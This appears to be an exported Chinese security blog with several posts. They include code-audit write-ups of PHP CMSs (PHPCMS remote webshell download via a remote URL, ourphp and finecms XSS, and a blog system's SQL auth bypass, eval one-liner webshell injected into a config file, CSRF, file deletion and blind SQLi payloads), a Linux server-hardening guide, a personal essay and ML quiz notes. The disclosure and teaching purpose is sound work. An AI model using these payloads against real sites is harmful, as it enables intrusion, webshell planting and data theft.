$newfile = $uploaddir.$filename; $upload_func = $this-&gt;upload_func; if($upload_func($file, $newfile)) &#123; $oldpath[] = $k; $GLOBALS['downloadfiles'][] = $newpath[] = $uploadpath.$filename; @chmod($newfile, 0777); $fileext = fileext($filename); if($watermark)&#123; watermark($newfile, $newfile,$this-&gt;siteid); &#125; $filepath = $dir.$filename; $downloadedfile = array('filename'=&gt;$filename, 'filepath'=&gt;$filepath, 'filesize'=&gt;filesize($newfile), 'fileext'=&gt;$fileext); $aid = $this-&gt;add($downloadedfile); $this-&gt;downloadedfiles[$aid] = $filepath; &#125; &#125; return str_replace($oldpath, $newpath, $value); &#125; 依旧只找关键部分，先来到1$string = new_stripslashes($value); 拐进去看一下12345function new_stripslashes($string) &#123; if(!is_array($string)) return stripslashes($string); foreach($string as $key =&gt; $val) $string[$key] = new_stripslashes($val); return $string;&#125; 也没啥特别的，就是一个数组版的stripslashes函数，然后来到1if(!preg_match_all("/(href|src)=([\"|']?)([^ \"'&gt;]+\.($ext))\\2/i", $string, $matches)) return $value; 这里对我们的payload进行了正则匹配，$ext是一个允许的拓展名的数组，如果匹配不到就会退出1$ext = &apos;gif|jpg|jpeg|bmp|png&apos; 这里还是挺好绕过的1src=http://files.pupiles.com/webshell/webshell.php#.jpg 所以我们往下继续看来到这一行1$remotefileurls[$matche] = $this-&gt;fillurl($matche, $absurl, $basehref); 我们的url经过了一个叫做fillurl的方法处理代码比较长，为了节省文章篇幅，我就截取了最重要的部分123456789$surl = trim($surl); if($surl=='') return ''; $urls = @parse_url(SITE_URL); $HomeUrl = $urls['host']; $BaseUrlPath = $HomeUrl.$urls['path']; $BaseUrlPath = preg_replace("/\/([^\/]*)\.(.*)$/",'/',$BaseUrlPath); $BaseUrlPath = preg_replace("/\/$/",'',$BaseUrlPath); $pos = strpos($surl,'#'); if($pos&gt;0) $surl = substr($surl,0,$pos); 可以看到这里不仅仅对我们的url没有进行任何的过滤，还帮助我们把#后面的内容全部省去了，离成功又进了一步，我们调回去继续看12$upload_func = $this-&gt;upload_func; if($upload_func($file, $newfile)) 这里我们可以看到进行了$upload_func函数的操作，我们在最开始可以看到该变量的赋值123function __construct($module='', $catid = 0,$siteid = 0,$upload_dir = '') &#123; $this-&gt;upload_func = 'copy'; &#125; 那么思路就很清晰了，我们调用了php的copy方法对我们传入payload的url进行了处理。至此漏洞复现成功(完结，撒花!)(PS1:既然这里的url我们是可控的，那是不是也存在ssrf漏洞呢)(PS2:网上看别的大佬复现的时候会出现mysql报错)然而我却只是提示个操作失败，如果有知道的师傅请留个言，谢谢]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux安全运维之我见]]></title>
    <url>%2Flinux%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%E4%B9%8B%E6%88%91%E8%A7%81.html</url>
    <content type="text"><![CDATA[emmm…先给大家分享一下暑假学习linux的时候画的一个思维导图最近在AWS上花了8块钱买(送)了一年的服务器，布好自己的网站后尝试了一下简单的压力测试，结果瞬间GG。于是翻起了以前的学linux运维时候记得笔记加上自己对安全运维的一些理解，对自己的服务器进行了新一轮的加固，至于具体是怎么做的，还请各位看官听我细细道来。 这里我先说明一下我服务器的环境，用的是AWS的Liunx系统(仿centos)。删除默认账户linux默认会启动很多不必要的账户，下面是某次我的服务器上的一些默认用户账号越多，系统就越容易受到攻击。所以可以用1userdel 用户名 限制su权限默认情况下，以普通用户登录系统后，执行 su root 命令，然后键入 root 用户的密码，就可以切换成 root 用户。这样做并不安全，所以我们需要配置一下安全策略，使其只针对我们指定的用户才可以切换成root用户1vim /etc/pam.d/su 把图中画线部分去掉#后改为1auth required pam_wheel.so group=root 这样只有root组的用户才可以切换成root,如下命令更换用户的用户组1usermod -a -G groupA user Iptables说起linux安全运维，首当其冲的肯定是Iptables的配置，对于常见的DOS攻击，一般是与服务器建立多条半开链接导致堵塞服务器对外通信，严重可导致服务器CPU爆炸而宕机。所以对此我们可以配置单一IP的最大连接数和在一定时间内的最大连接数进行设置，可以有效的防止DOS攻击以及一些扫描器的扫描，比如AWVS,sqlmap，御剑，balabala~ 限制IP连接数和连接速率我们可以限制IP的网络连接数和速度等，限制过快的连接频率，这样不仅可以在一定程度上限制对方的扫描器，还可以防御一些dos攻击。 单个IP的最大连接数为 201iptables -I INPUT -p tcp --dport 80 -m connlimit --connlimit-above 20 -j REJECT 单个IP在60秒内只允许最多新建15个连接12iptables -A INPUT -p tcp --dport 80 -m recent --name BAD_HTTP_ACCESS --update --seconds 60 --hitcount 15 -j REJECTiptables -A INPUT -p tcp --dport 80 -m recent --name BAD_HTTP_ACCESS --set -j ACCEPT 防止端口复用类的后门或者shell假设病毒木马程序通过22，80端口向服务器外传送数据，这种方式发向外发的数据不是我们通过访问网页请求而回应的数据包。我们可以禁止这些没有通过请求回应的数据包。123iptables -A OUTPUT -p tcp --sport 22 -m state --state ESTABLISHED -j ACCEPTiptables -A OUTPUT -p tcp --sport 80 -m state --state ESTABLISHED -j ACCEPTiptables -A OUTPUT -p tcp --sport 443 -m state --state ESTABLISHED -j ACCEP Apache配置对于某些dos攻击方式如slowhttptest利用超时时间对你进行攻击的，一般的iptables不能很好的进行防御。所以需要配置apache的超时时间centos默认配置文件在1/usr/share/doc/httpd24-2.4.27/httpd-default.conf 改完需要在etc/httpd/conf/httpd.conf里面配置一下东西 流量checkcentos的apache目录在12/etc/httpd/logs/access_log #访问日志/etc/httpd/logs/error_log #出错日志 这里只分享几款check工具LogForensics 腾讯实验室 https://security.tencent.com/index.php/opensource/detail/15北风飘然@金乌网络安全实验室 http://www.freebuf.com/sectool/126698.html网络ID为piaox的安全从业人员： http://www.freebuf.com/sectool/110644.html网络ID：SecSky http://www.freebuf.com/sectool/8982.html网络ID：鬼魅羊羔http://www.freebuf.com/articles/web/96675.html 定期查杀webshell这里放个精简版的webshell查杀脚本http://www.jincon.com/archives/147/ 配置crontab，每2个小时查杀一次12crontab -e* 2 * * * python scanwebshell.py /var/www/html 关键目录给属性123456chattr +i ~/.sshchattr +i /var/www/htmlchattr +i /etc/passwdchattr +i /etc/shadowchattr +i /etc/groupchattr +i /etc/gshadow 配置全局waf一个wafhttp://hackblog.cn/post/75.html1find /var/www/html -type f -path &quot;*.php&quot; | xargs sed -i &quot;s/&lt;?php/&lt;?php\nrequire_once(&apos;\/tmp\/waf.php&apos;);\n/g&quot; 一条命令配置查找/var/www/html目录下的所有php文件然后添加一个require_once(&#39;waf.php&#39;) 关闭系统不使用的服务123456789101112131415161718192021222324252627282930313233chkconfig cups off #打印机 chkconfig bluetooth off # 蓝牙 chkconfig hidd off # 蓝牙 chkconfig ip6tables off # ipv6 chkconfig ipsec off # vpn chkconfig auditd off #用户空间监控程序 chkconfig autofs off #光盘软盘硬盘等自动加载服务 chkconfig avahi-daemon off #主要用于Zero Configuration Networking ，一般没什么用建议关闭 chkconfig avahi-dnsconfd off #主要用于Zero Configuration Networking ,同上,建议关闭 chkconfig cpuspeed off #动态调整CPU频率的进程，在服务器系统中这个进程建议关闭 chkconfig isdn off #isdn chkconfig kudzu off #硬件自动监测服务 chkconfig nfslock off #NFS文档锁定功能。文档共享支持，无需的能够关了 chkconfig nscd off #负责密码和组的查询，在有NIS服务时需要 chkconfig pcscd off #智能卡支持，,如果没有可以关了 chkconfig yum-updatesd off #yum更新 chkconfig acpid off chkconfig autofs off chkconfig firstboot off chkconfig mcstrans off #selinux chkconfig microcode_ctl off chkconfig rpcgssd off chkconfig rpcidmapd off chkconfig setroubleshoot off chkconfig xfs off chkconfig xinetd off chkconfig messagebus off chkconfig gpm off #鼠标 chkconfig restorecond off #selinux chkconfig haldaemon off chkconfig sysstat off chkconfig readahead_early off chkconfig anacron off #修改ssh服务的端口12345678vi /etc/ssh/sshd_config #修改端口#Port 22 #关闭22端口 Port 6022 #增加6022端口 #重启sshd服务 service sshd restart 检查一下sshd的监听端口对不对 netstat -lnp|grep ssh 记得最后把iptables的相应端口打开12iptables -A INPUT -p tcp --dport 6022 -j ACCEPT iptables -A OUTPUT -p udp --sport 6022 -j ACCEPT #不允许从不同的控制台进行root登陆“/etc/securetty”文件允许你定义root用户可以从哪些TTY终端登陆编辑”/etc/securetty”文件，在不需要登陆的TTY终端前添加“#”标志，来禁止从该TTY终端进行root登陆。一般情况下留2个tty终端就行了。123456789101112tty1tty2#tty3#tty4#tty5#tty6#tty7#tty8#tty9#tty10#tty11#ttyS0 最后也是最要的一条，别懒，坚持每天看一下自己的服务器日志以及history历史命令记录，还有用last或者lastlog命令查看一下历史登录信息,w查看当前所有用户登录信息。一句老话，没有永远安全的系统，一切安全策略只是为了增加攻击者的攻击成本。笔者能力有限，目前只能想到这些措施，如果各位大佬有好的想法欢迎留言参考 http://bobao.360.cn/ctf/learning/210.htmlhttp://blog.csdn.net/hanzheng260561728/article/details/51549037]]></content>
      <categories>
        <category>learning and think</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[一年]]></title>
    <url>%2Fsuibi3.html</url>
    <content type="text"><![CDATA[是啊，就是这么快，夏日的滚滚热浪还未散去，一场持续的秋雨就迫不及待洗刷走夏日留下的痕迹……不管怎么说，大学都已然过去了4分之1了，还记得去年暑假幻想中的大学生活会如此倾城倾国，沉鱼落雁。然而现实的确是很骨感，漫不经心的过着每一天，恍恍惚惚的上着每一节课，结识了形形色色的人，经历了林林总总的事，穿越着越走越熟悉，越看越陌生的路，徜徉在平凡而不平淡的日子里，大方而拘谨的挥霍最后的青春。不知不觉我觉得自己成了一名彻头彻尾的宅男，电脑似乎已经成为了我生命中不可或缺的一部分，有时候甚至宁愿在电脑前发呆也不愿意走出宿舍去看看外面的世界。或许是高中严苛的住宿学校的后遗症吧，我不知道这到底是不是我想要的生活，但事实是我的内心并不排斥这种生活，简单，单纯，不掺杂一点杂质。如今拿到了想都没想过的奖学金，进了传说中的实验班，认识很多以前耳熟能详的大师傅们，Web的鱼师傅，二进制的熊猫师傅，去师傅，武师傅，来自智科的大哥,当然还有很多别的师傅就不一一列举了…相比于110多人的大教室，40人的小教室感觉更显归属感，(至少英语课被点中的概率大大上升了。)学习氛围也比以前好了很多。但是不管怎么样，还是那句老话，自身努力才是获得成功的唯一条件。p总，chu，吴神…优秀的学长师傅们一个接着一个毕业了，不知不觉我已经变成了学弟学妹口中的学长，也成为了一名给别人答疑解惑的人。但是我自己却很迷茫，因为啥都不会的你拿什么去给学弟学妹分享。每每想至此，内心总是备受煎熬。但是时间永远都是向前，新的一学年总是让我们燃起新的热血。生活还要继续，也许早一步出发还赶得上暮春的最后一次落日，也许早一步改变还能迎上初夏的第一缕微风，毕竟在我们的前面还有长长的，长长的路。最后给大家道个歉，最近一段时间一直没有更新博客，主要因为开学几天实在太忙了，一开学忙着招新然后就金工实习去车间做了2个礼拜的锤子，还有就是用PHP帮协会写了一个报名系统，鉴于这个暑假爆出了很多的框架通用漏洞，所以这次的报名系统我想了很久还是放弃用现成的框架，项目暂时就不开源了，毕竟代码写得比较烂。。。以后有机会还是会开源的]]></content>
      <categories>
        <category>随笔</category>
      </categories>
      <tags>
        <tag>随笔</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[机器学习吴恩达练习题]]></title>
    <url>%2Fmaching_learning.html</url>
    <content type="text"><![CDATA[最近花了一段时间在course和B站学习了一下吴恩达的机器学习。就顺便把当时做题的截图发出来，为以后的自己做个参考。（部分当时没有截图）顺便发一个当时在网上找的某位大牛写的笔记,個人感覺寫的非常詳細了，有需要的小夥伴可以參考一下。順便吐槽一下机器学习的算法是真的让人头大。编程题暂时我还在做所以暂时没有。题目有问题大家可以私信我的QQ http://www.cnblogs.com/yangmang/p/6352118.html 第一周第三次第一题 第二题 第三题 第四题 第五题 总结 第二周第一次第一题 第二题 第三题 第四题 第五题 总结 第三周第一次第一题 第二题 第三题 第四题第五题 总结 第三周第二次第一题 第二题 第三题 第四题 第五题 总结 第四周第一次第一题 第二题 第三题 第四题 第五题 总结 第五周第二次第一题 第二题 第三题 第四题 第五题 总结 第六周第一次第一题 第二题 第三题 第四题 第五题 总结 第六周第二次第一题 第二题 第三题 第四题 第五题 总结 第七周第一次第一题 第二题 第三题 第四题 第五题 总结 第八周第一次第一题 第二题 第三题 第四题 第五题 总结 第八周第二次第一题 第二题 第三题 第四题 第五题 总结 第九周第一次第一题 第二题 第三题 第四题 第五题 总结 第九周第二次第一题 第二题 第三题 第四题 第五题 总结第十周第一次第一题 第二题 第三题 第四题 第五题 总结 第十一周第一次第一题 第二题 第三题 第四题 第五题 总结]]></content>
      <categories>
        <category>learning and think</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ourphp全版本有条件存储型XSS]]></title>
    <url>%2Fourphp.html</url>
    <content type="text"><![CDATA[暑假太闲了，网上找了一个cms我们来看看，影响其实不大(前台getshell这种的对于较大的CMS实在挖不到啊)所以各位客观就当个甜点小食看看就好 问题出在/function/ourphp_search.class.php 废话不多说，直接看关键代码 123456$content = dowith_sql($_REQUEST['content']);$sid = dowith_sql($_REQUEST['sid']);$lang = dowith_sql($_REQUEST['lang']);$inputno = $ourphp_adminfont['inputno'];$strlength = $ourphp_adminfont['strlength'];$type = dowith_sql($_REQUEST['type']); 这里我们我们的输入经过一个叫做dowith_sql的函数过滤 那果断跟进去瞅瞅 12345678910111213141516171819202122232425262728293031function dowith_sql($ourphpstr)&#123; $ourphpstr = addslashes($ourphpstr); $ourphpstr = str_ireplace(" and ","",$ourphpstr); $ourphpstr = str_ireplace(" or ","",$ourphpstr); $ourphpstr = str_ireplace("execute","",$ourphpstr); $ourphpstr = str_ireplace("update","",$ourphpstr); $ourphpstr = str_ireplace("count","",$ourphpstr); $ourphpstr = str_ireplace("chr","",$ourphpstr); $ourphpstr = str_ireplace("truncate","",$ourphpstr); $ourphpstr = str_ireplace("char","",$ourphpstr); $ourphpstr = str_ireplace("declare","",$ourphpstr); $ourphpstr = str_ireplace("select","",$ourphpstr); $ourphpstr = str_ireplace("create","",$ourphpstr); $ourphpstr = str_ireplace("delete","",$ourphpstr); $ourphpstr = str_ireplace("insert","",$ourphpstr); $ourphpstr = str_ireplace("limit","",$ourphpstr); $ourphpstr = str_ireplace("extractvalue","",$ourphpstr); $ourphpstr = str_ireplace("concat","",$ourphpstr); $ourphpstr = str_ireplace("&amp;&amp;","",$ourphpstr); $ourphpstr = str_ireplace("||","",$ourphpstr); $ourphpstr = str_ireplace("&lt;script","",$ourphpstr); $ourphpstr = str_ireplace("&lt;iframe","",$ourphpstr); $ourphpstr = str_ireplace("&lt;embed","",$ourphpstr); $ourphpstr = str_ireplace("*","",$ourphpstr); $ourphpstr = str_ireplace("#","",$ourphpstr); $ourphpstr = str_ireplace("'","",$ourphpstr); $ourphpstr = str_ireplace("&lt;","&amp;lt;",$ourphpstr); $ourphpstr = str_ireplace("&gt;","&amp;gt;",$ourphpstr); $ourphpstr = str_ireplace("&amp;","&amp;amp;",$ourphpstr); return $ourphpstr;&#125; 看到这里我相信各位玩过CTF的大牛一眼就能看出来了，虽然把什么select替换为空但是可以绕过1seselectlect 不过’也过滤了这就比较尴尬了，不过今天我们不讨论注入我们看到是对&lt;&gt;进行了过滤，看似没有办法进行我们的xss，但是我们先看看输出点再说我们在输入框里输入test然后查看一下元素 这里我们发现我们的payload出现在a标签的属性里，那么就可以绕过&lt;&gt;的过滤了 我们输入 1&quot; onclick=&quot;alert(1)&quot; &quot; 构造如下payload 1&lt;a href="search.php?cn-&amp;content=" onclick="alert(1)" "&amp;lang=cn&amp;sid=product"&gt;test&lt;/a&gt; 这里虽然有条件(多次提交弄到热门搜索)，因为毕竟是热门搜索，所以一般用户点击的几率比较大，所以危害还是比较大的]]></content>
      <categories>
        <category>vulnerabilities</category>
      </categories>
      <tags>
        <tag>vulnerabilities</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[The latest version of finecms unlimited XSS]]></title>
    <url>%2Ffinecms.html</url>
    <content type="text"><![CDATA[CVE-2017-12846the problem is in /finecms/dayrui/controllers/member/api.php Third-party platforms are invoked here, but the filtering is not strictly enforced.The vulnerability function is as follows 1234567891011121314151617181920public function baidumap() &#123; $list = $this-&gt;input-&gt;get('city') ? explode(',', urldecode($this-&gt;input-&gt;get('city'))) : NULL; $city = isset($list[0]) ? $list[0] : ''; $value = $this-&gt;input-&gt;get('value'); $value = strlen($value) &gt; 10 ? $value : ''; $this-&gt;template-&gt;assign(array( 'city' =&gt; $city, 'value' =&gt; $value, 'list' =&gt; $list, 'name' =&gt; $this-&gt;input-&gt;get('name'), 'level' =&gt; (int)$this-&gt;input-&gt;get('level'), 'width' =&gt; $this-&gt;input-&gt;get('width'), 'height' =&gt; $this-&gt;input-&gt;get('height') - 30, )); $this-&gt;template-&gt;display('baidumap.html', 'admin'); &#125; Here we can see$valueand$cityParameters do not open XSS filter，although$valueare limited by a length of 10，The result is that even a short domain name cannot construct an effective XSS，But our $city parameters do not filter effectively，And it is directly assign to the template.Let’s look at the templatebaidumap.html 123456789​&lt;div id="toolbar"&gt; &lt;div class="selCity"&gt; &lt;div class="right"&gt; &lt;a href="javascript:;" class="mark" onClick="addMarker();"&gt;&#123;fc_lang('添加标注')&#125;&lt;/a&gt; &lt;a href="javascript:;" onClick="removeMarker();" class="map"&gt;&#123;fc_lang('重置地图')&#125;&lt;/a&gt; &lt;/div&gt; &lt;strong id="curCity"&gt;&#123;$city&#125;&lt;/strong&gt; [&lt;a onClick="mapClose();" id="curCityText" href="javascript:;"&gt;&#123;fc_lang('更换城市')&#125;&lt;/a&gt;] &lt;/div&gt; You can see that our $city variable is injected directly into the &lt; strong &gt; label, so we can construct the payload directly 12​http://localhost/index.php?s=member&amp;c=api&amp;m=baidumap&amp;city=&lt;script&gt;alert(&apos;1&apos;)&lt;/script&gt;&amp;value=123 (not just baidumap, the upload and other functions on the back of the page have this situation, the same solution)​]]></content>
      <categories>
        <category>vulnerabilities</category>
      </categories>
      <tags>
        <tag>vulnerabilities</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[浅谈代码审计入门实战:某博客系统最新版审计之旅]]></title>
    <url>%2Fcode-check.html</url>
    <content type="text"><![CDATA[第一次正式的审一次CMS，虽然只是一个很小的博客系统(提交都不一定收的那种)，漏洞也都很简单，但是也算是积累了不少经验，所以最后想来还是在此做个分享，博客系统的CMS就不说了，毕竟有个官网挂着。。。缘起某日翻阅某朋友博客的时候无意间发现有个小型的CMS，反正暑假闲的无聊就去审了一下代码(正好拿来练练手)，问题挺严重的，好多参数都没有进行过滤，光注入就有好多处，因为文章篇幅有限，这里就不一一列举了，这里只把我找到的漏洞中每类最典型的剖析一下。 身份验证漏洞首先一上来就是一个很简单的洞，后台就可以万能密码绕过，问题出在这里ad/login.php先看代码12345678910111213function jsloginpost()&#123;global $tabhead;global $txtchk;@$user=$_POST["user"];@$psw=$_POST["psw"];$psw = authcode(@$psw, 'ENCODE', 'key',0); @$loginlong=$_POST["loginlong"];setcookie("lggqsj",date('Y-m-d H:i:s',time()+$loginlong), time()+60*60*24,"/; HttpOnly" , "",'');$tab=$tabhead."adusers";$chk=" where adnaa='".$user."' and adpss='".$psw."' ";mysql_select_db($tab);$sql = mysql_query("select * from ".$tab.$chk); 这里我们并没有对POST和GET参数进行过滤(一开始我还以为定义了全局过滤，结果找了半天没找到，发现根本就没有过滤)所以登陆可以直接万能密码绕过12username=qweq' or 1=1#password=123 任意文件修改导致getshell进了后台以后我们先大致浏览一下功能，发现这里有个修改站点信息的功能,进入后台找到相应的setconfig.php我们先看一下大致的表单提交格式123456789101112131415&lt;?function save()&#123;global $root,$dbuser,$dbpsw,$dbname,$tabhead,$webname,$webkeywords,$webinfo,$weburl,$webauthor,$webbegindate,$pagenum,$cachepath,$date,$starttime,$themepath,$artpath,$tagpath;$file="../cmsconfig.php";$text = file_get_contents($file);$text2=$text;$text2=str_replace('"'.$weburl.'"','"'.$_POST[1].'"',$text2);$text2=str_replace('"'.$webbegindate.'"','"'.$_POST[2].'"',$text2);$text2=str_replace('"'.$webname.'"','"'.$_POST[3].'"',$text2);$text2=str_replace('"'.$webkeywords.'"','"'.$_POST[4].'"',$text2);$text2=str_replace('"'.$webinfo.'"','"'.$_POST[5].'"',$text2);$text2=str_replace('"'.$webauthor.'"','"'.$_POST[6].'"',$text2);$text2=str_replace('"'.$artpath.'"','"'.$_POST[7].'"',$text2);$text2=str_replace('"'.$tagpath.'"','"'.$_POST[8].'"',$text2);$text2=str_replace('"'.$cachepath.'"','"'.$_POST[9].'"',$text2);?&gt; 这里我们我们可以很容易发现它对我们的输入并没有进行任何过滤就直接替换了原文件的内容，我们追踪到源文件所以我们可以构造一句话插入1";@eval($_POST['cmd']);/* 然后用菜刀链接cmsconfig.php文件 XSS既然是博客系统，那么最重要的一定是发布文章的模块，所以我们跟进去看一下，问题出在art.php先大致看一下代码有无过滤 添加文章12345678&lt;?php function addart()&#123;$_SESSION['jdate']='';$_SESSION['jid']='';global $webauthor,$date,$weburl;global $tabhead;$title=$_GET['title'];$content=$_GET['content'];?&gt; 这里乍一看是没有进行过滤的，接着找一下表单结构12345678910111213&lt;div id=addart_left&gt;&lt;span id="jieguo"&gt;&lt;/span&gt;&lt;form id="frm" name="frm" method="post" action="?g=editsave" &gt;&lt;input name=id type=hidden value="&lt;?=$id?&gt;" &gt;&lt;p&gt;&lt;input style="width:400px" type=text name=title value="&lt;?=$title?&gt;" &gt;文章标题，严禁特殊符号&lt;/p&gt;&lt;p&gt;&lt;input style="width:400px" name=htmlname type=text value="&lt;?=$htmlname?&gt;" &gt;html别名，静态目录，严禁特殊符号&lt;/p&gt;&lt;p &gt;&lt;input style="width:400px;" type=text name=pic id=pic_txt value="&lt;?=$pic?&gt;" title="您可在这里直接输入图片地址如http://www.axublog.com/logo.jpg" onchange="changepic2()" &gt;填写缩略图网址 &lt;/p&gt;&lt;p&gt;&lt;textarea id="content" name="content" style="width:670px;height:380px;visibility:hidden;"&gt;&lt;?=htmlspecialchars($content);?&gt;&lt;/textarea&gt;&lt;/p&gt;&lt;/div&gt; 这里对$content编码进行了标签转义，检查了一下输出点后发现绕不过，想到试试别的参数，于是找到了tags参数添加文章的函数的确没有过率，然而到保存页面的时候发现存在问题，作者自己定义了一个过滤函数12$tags=$_POST['tags'];if($tags=='')&#123;$tags=$_SESSION['tags'];&#125;$tags=htmlnameguolv($tags); 跟进去过滤函数123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051function htmlnameguolv($str)&#123;$str = str_replace('`', '', $str); $str = str_replace('·', '', $str); $str = str_replace('~', '', $str); $str = str_replace('!', '', $str); $str = str_replace('！', '', $str); $str = str_replace('@', '', $str); $str = str_replace('#', '', $str); $str = str_replace('$', '', $str); $str = str_replace('￥', '', $str); $str = str_replace('%', '', $str); $str = str_replace('^', '', $str); $str = str_replace('……', '', $str); $str = str_replace('&amp;', '', $str); $str = str_replace('*', '', $str); $str = str_replace('(', '', $str); $str = str_replace(')', '', $str); $str = str_replace('（', '', $str); $str = str_replace('）', '', $str); $str = str_replace('——', '', $str); $str = str_replace('+', '', $str); $str = str_replace('=', '', $str); $str = str_replace('|', ',', $str); $str = str_replace('\\', '', $str); $str = str_replace('[', '', $str); $str = str_replace(']', '', $str); $str = str_replace('【', '', $str); $str = str_replace('】', '', $str); $str = str_replace('&#123;', '', $str); $str = str_replace('&#125;', '', $str); $str = str_replace(';', '', $str); $str = str_replace('；', '', $str); $str = str_replace(':', '', $str); $str = str_replace('：', '', $str); $str = str_replace('\'', '', $str); $str = str_replace('"', '', $str); $str = str_replace('“', '', $str); $str = str_replace('”', '', $str); $str = str_replace('，', ',', $str); $str = str_replace('&lt;', '', $str); $str = str_replace('&gt;', '', $str); $str = str_replace('《', '', $str); $str = str_replace('》', '', $str); $str = str_replace('.', '', $str); $str = str_replace('。', '', $str); $str = str_replace('/', '', $str); $str = str_replace('、', '', $str); $str = str_replace('?', '', $str); $str = str_replace('？', '', $str);return $str;&#125; 写了一堆替换，也没想到啥绕过方法，然后又换了另一个参数title这回发现这个参数并没有进行过滤，这是在输入的时候给了个不要输入特殊字符的警告。前台查看文章 当然这里也是存在二次注入的 CSRF问题出在/ad/admin.php，关键代码如下1234567891011121314151617&lt;?function add()&#123;?&gt;&lt;ul&gt;&lt;li&gt;&lt;a target="main" href='right.php'&gt;&lt;b&gt;您的位置：后台首页&lt;/b&gt;&lt;/a&gt; &gt;&lt;a target="main" href='admin.php'&gt;&lt;b&gt;管理员列表&lt;/b&gt;&lt;/a&gt; &gt; &lt;a target="main" href='admin.php?g=add'&gt;&lt;b&gt;添加管理员&lt;/b&gt;&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt;&lt;div id=adform&gt;&lt;form id="frm" action="?g=addsave" method="post"&gt;&lt;p&gt;&lt;input id=text type="text" name="ad_user" size=20 value=""&gt;请输入帐号&lt;/p&gt;&lt;p&gt;&lt;input id=text type="password" name="ad_psw" size=20 value=""&gt;请输入密码&lt;/p&gt; &lt;p&gt;&lt;input id=text type="password" name="ad_psw2" size=20 value=""&gt;重新输入密码&lt;/p&gt; &lt;p&gt;&lt;button id="send" onclick=submit() &gt;添加&lt;/button&gt;&lt;/p&gt;&lt;/form&gt;&lt;/div&gt;&lt;?&#125;?&gt; 这里并没有做相应的token认证所以可能存在csrf漏洞，我们用burp截包这里有个小技巧可以直接用burp直接生成csrf钓鱼页面完成后丢弃这个包，我们先看我们的管理员有几个 点击html页面的提交 再后来看我们的管理员 任意文件删除问题处在/app/dbbackup/index.php中关键代码如下1234if($g=='del')&#123;$p=$_REQUEST['p'];if($p=='')&#123;echo '&lt;script&gt;alert("文件名为空，无法删除！");location.href="?"&lt;/script&gt;';&#125;unlink($p); 这里大概看一眼就能明白，p参数可控，且没有进行过滤，所以可以直接删除任意文件，这种任意文件删除一般可以删除install.lock从而导致重装漏洞，这里这个博客系统是安装完成后自动把安装页面直接删除了，所以暂不存在该漏洞 SQL注入问题出在hit.php，关键代码如下123456789101112131415161718192021222324&lt;?phpheader("Content-type:text/html; charset=utf-8");require("cmsconfig.php");require("class/c_other.php");sqlguolv();$g=$_GET['g'];if ($g=='arthit')&#123;$id=$_GET['id']; if($id!='')&#123; $tab=$tabhead."arts";mysql_select_db($tab);$sql=mysql_query("UPDATE ".$tab." SET hit=hit+1 where id=".$id);$sql = mysql_query("select * from ".$tab." where id=".$id);$row=mysql_fetch_array($sql); $str=$row['hit']; echo 'document.write('.$str.');'; &#125;&#125;?&gt; 看到这里可能很多同学认为id是我们可控并且没有进行任何过滤的，其实作者这里是做了过滤，关键点在这里这里引用了c_other.php的sqlguolv函数，我们跟进去看一下关键代码1234Function sqlguolv() &#123; header("Content-type:text/html; charset=utf-8");if (preg_match('/select|insert|update|delete|\'|\\*|\*|\.\.\/|\.\/|union|into|load_file|outfile/i',$_SERVER['QUERY_STRING'])==1 or preg_match('/select|insert|update|delete|\'|\\*|\*|\.\.\/|\.\/|union|into|load_file|outfile/i',file_get_contents("php://input"))==1)&#123;echo "警告 非法访问！"; exit;&#125;&#125; 这里是把$_SERVER[&#39;QUERY_STRING&#39;])与关键字做了比较，起到了一定的过滤效果，然而过滤并不完全，我们依然可以利用盲注绕过绕过很简单，这里就只贴一个payload了1hit.php?g=arthit&amp;id=1 and ascii(mid((database()),1,1))&gt;10 脚本懒得写了 做个总结吧，代码审计还是那2种老套路，第一是通读代码，这样的好处是可以挖掘一些逻辑漏洞，比如条件竞争之类的，第二是直接全局搜索，找关键函数，看变量是否可控，是否存在过滤balabala的，对于初学者来说个人认为最快的方法是找一篇老旧的CMS自己尝试审计一下，一般来说是前台(浏览器)找到php,后台对应找php源码看看，主抓一些危险函数及waf函数看看有没有绕过可能。]]></content>
      <categories>
        <category>learning and think</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[浅谈XSS的小技巧与浏览器编码]]></title>
    <url>%2Fxss.html</url>
    <content type="text"><![CDATA[最近系统学了一下以前一直模糊的浏览器编码概念，顺便总结了一下XSS的原理，在此做一个小笔记首先先介绍一下浏览器的解析概念 HTML五大元素 空元素(Void elements)，如&lt;area&gt;,&lt;br&gt;,&lt;base&gt;等等 原始文本元素(Raw text elements)，有&lt;script&gt;和&lt;style&gt; RCDATA元素(RCDATA elements)，有&lt;textarea&gt;和&lt;title&gt; 外部元素(Foreign elements)，例如MathML命名空间或者SVG命名空间的元素 基本元素(Normal elements)，即除了以上4种元素以外的元素 五类元素的区别如下： 空元素，不能容纳任何内容（因为它们没有闭合标签，没有内容能够放在开始标签和闭合标签中间）。 原始文本元素，可以容纳文本。 RCDATA元素，可以容纳文本和字符引用。 外部元素，可以容纳文本、字符引用、CDATA段、其他元素和注释 基本元素，可以容纳文本、字符引用、其他元素和注释 HTML解析器一个HTML解析器作为一个状态机，它从输入流中获取字符并按照转换规则转换到另一种状态。在解析过程中，任何时候它只要遇到一个’&lt;’符号（后面没有跟’/‘符号）就会进入“标签开始状态(Tag open state)”。然后转变到“标签名状态(Tag name state)”，“前属性名状态(before attribute name state)”……最后进入“数据状态(Data state)”并释放当前标签的token。当解析器处于“数据状态(Data state)”时，它会继续解析，每当发现一个完整的标签，就会释放出一个token。协议是不能进行编码的看到这里我相信大部分的读者都是懵逼的，所以这里我来举个例子 在解析&lt;这个符号以前，状态是Data State 然后解析到&lt;的时候，解析状态变为Tag open 